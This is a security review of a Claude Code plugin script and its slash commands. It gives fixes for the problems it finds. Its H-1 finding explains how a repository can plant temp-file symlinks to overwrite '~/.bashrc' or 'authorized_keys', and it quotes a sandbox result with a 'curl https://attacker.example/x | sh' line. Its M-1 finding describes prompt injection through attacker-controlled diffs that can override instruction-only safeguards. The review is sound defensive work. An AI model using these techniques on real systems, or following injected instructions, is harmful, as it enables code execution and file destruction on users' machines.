# Security review: `truecast-plugin.sh` and `/truecast:*` commands

## Verdict: Yes, a user can get owned, but only through `--project` on an untrusted repo

I found one way to run code on the user's machine, and I reproduced it in a sandbox. The cause is a single repeated mistake: the temp files the script writes before renaming them are never checked for symlinks. Everything else is well hardened. The default `~/.claude/agents` path, name and version checks, delete containment and secret redaction all held up. There's also one problem in the slash commands that weakens the "ask the user first" model.

---

## H-1: Planted temp-file symlinks let a repo overwrite `~/.bashrc` (confirmed)

**Where:** `remove_gitignore_line` (line 507) and `write_agent_file` (line 481).

`safe_write` checks the final path (`.gitignore`, `.claude/agents/<name>.md`) but never the temp file written next to it:

```bash
tmp="$gi.tmp-$$"; grep -vxF "$line" "$gi" >"$tmp"; mv "$tmp" "$gi"     # 508-510
cp "$WORK/body" "$target.tmp-$$"; mv "$target.tmp-$$" "$target"        # 481-482
```

Both `>` and `cp` follow a symlink that's already sitting at the temp path. In `--project` mode the repo is untrusted and the attacker controls that directory. `$$` (the process ID) isn't secret, so the repo can simply ship a symlink for every likely value.

**Attack A, code execution through `remove --project`:**
- The repo ships three things:
  - `.claude/agents/foo.md` containing the `GENERATED by truecast` stamp.
  - A `.gitignore` containing `.claude/agents/foo.md` plus a payload line.
  - A set of `.gitignore.tmp-<N> -> ~/.bashrc` symlinks.
- The user runs `/truecast:remove foo --project`. The plan just says `DELETE …/.claude/agents/foo.md`, and they approve.
- Result: `~/.bashrc` is replaced with the attacker's `.gitignore` minus one line. In my sandbox run:
  ```
  --- victim ~/.bashrc:
  curl https://attacker.example/x | sh
  ```
- The command runs at the user's next shell. Afterwards the repo's `.gitignore` is itself a symlink to `~/.bashrc`.

**Attack B, overwriting any file through `install --project`:**
- Same trick with `.claude/agents/foo.md.tmp-<N> -> ~/.ssh/authorized_keys`.
- In my run, `authorized_keys` was replaced with the agent body, and the repo's agent file became a symlink to it.
- The content is fixed rather than attacker-chosen, so this destroys files instead of running code. Targets could be `authorized_keys`, `~/.claude/settings.json` or `~/.gitconfig`.

**How practical it is:**
- On macOS, PIDs only go up to about 100k, so about 100k tiny symlinks cover every value. That's cheap.
- On this Linux box `pid_max` is 4,194,304. Covering the whole range is clumsy, but containers and older systems often use 32,768.
- In both attacks the user has to approve, but the plan they see looks harmless.

**Fix:**
- Create temp files with `mktemp "$(dirname "$x")/.$(basename "$x").XXXXXX"`. It refuses to reuse an existing file, so a planted symlink can't be followed.
- Run `safe_write "$root" "$tmp"` on the temp path as well.
- Make `mv -f`/rename the only thing that touches the final path.
- Apply the same pattern to `meta.json.tmp-$$`. It lives in the user's own home, so it's only defense in depth there.
- Remove the temp file when the operation fails.

## M-1: `allowed-tools: Bash` lets the model run any command without asking

All four commands declare `allowed-tools: Bash, Read` with no scope, so for the length of the command Claude can run any shell command without a permission prompt. The only things that keep `--yes`/`--force` behind user approval, and keep `$ARGUMENTS` shell-quoted, are instructions in the command text, which a prompt injection can override.

There are real injection paths:
- In `--project` drift mode, the plan prints a `diff` of a file the attacker controls (a stamped `.claude/agents/<name>.md` in a cloned repo).
- The `--project <path>` value is never validated by either layer.

The Step 0 rules are good, but they're advice to the model, not enforcement.

**Fix:**
- Scope the permission, for example `allowed-tools: Bash(bash *truecast-plugin.sh *)`. The `S=…; [ -f ] || …` setup snippet will need to become a single invocation for that rule to match.
- Better still, give apply its own pattern so `--yes` always triggers a real permission prompt from Claude Code.
- Validate `--project`'s path in the commands (it must be an existing directory) instead of passing it through as-is.

## L-1: Persona `core/` symlinks are copied into the user's home as-is

`cp -R` keeps symlinks (lines 411). A persona whose `core/skills/x.md` points to `~/.ssh/id_ed25519` ends up as a "craft" file the agent will happily Read into its context. The persona content comes from the same marketplace as the script, so this is a supply-chain/review risk rather than a direct exploit. A malicious symlink in a persona pull request is easier to miss than a script change. **Fix:** refuse the install if `find "$CLONE_DIR/core" -type l` finds anything, or copy with `-L` and check the result stays inside the persona directory.

## Informational (no action needed)

- **Lock path:** `lock_persona` resolves symlinks and can `rm -rf` the lock before any `safe_write` check (lines 378–390). It only matters if `~/.truecast` is already attacker-controlled, but adding the check would be cheap defense in depth.
- **Install plan never runs `safe_write`:** in `--project` mode a symlinked `.claude` is only caught at apply time. It still fails safely, but only after the shared craft has been written. Running `safe_write` while planning would let it fail before anything is written.
- **Marketplace check:** `grep '"name": "truecast"'` (line 160) proves nothing about where the clone came from. That's fine because it isn't used as a security check.
- **Fallback path:** if `CLAUDE_PLUGIN_ROOT` is unset, the command falls back to `/bin/truecast-plugin.sh`, a root-owned location. That's harmless.

## What held up under attack

- Persona names and versions are checked strictly before they touch any path, which blocks `../` escapes, including the `1.0.0/../..` style version trick.
- `safe_write` checks every path component, and `safe_rm` reuses the same check. Deletes stay inside the managed directories.
- A symlinked or unstamped agent file stops `remove` before anything is deleted.
- The final files themselves can't be redirected: planted symlinks at `.gitignore`, `mandate.md` or the agent file are all refused.
- Credentials embedded in a git remote URL are stripped before anything is stored, and control characters are removed.
- `--all` re-checks every name it reads from disk, and its own flag list is the only thing word-split.
- Without `--yes` nothing is written (I checked every code path).

**Priority:** fix H-1 before the next release, since it's a one-line pattern in two places. Then scope `allowed-tools` (M-1) so the plan-then-approve flow is enforced by Claude Code rather than by instructions to the model.
